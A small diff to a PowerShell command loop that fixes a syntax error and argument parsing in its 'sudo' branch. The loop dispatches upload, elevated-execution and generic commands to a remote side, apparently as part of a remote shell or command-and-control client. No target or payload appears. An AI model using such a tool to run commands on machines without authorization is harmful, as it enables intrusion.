@@ -69,9 +69,9 @@ while ($true) {
     } elseif ($command.StartsWith("upload ")) {
         $params = $command.Split(" ")
         Upload-File $params[1] $params[2]
-    } elseif ($command.StartsWith("sudo "){
-        $cmd = $command.Split("sudo ")
-        Elevated-Command $cmd[1]
+    } elseif ($command.StartsWith("sudo ")) {
+        $cmd = $command.Substring(5)
+        Elevated-Command $cmd
     } else {
         $response = Send-Command $command
         Write-Host $response
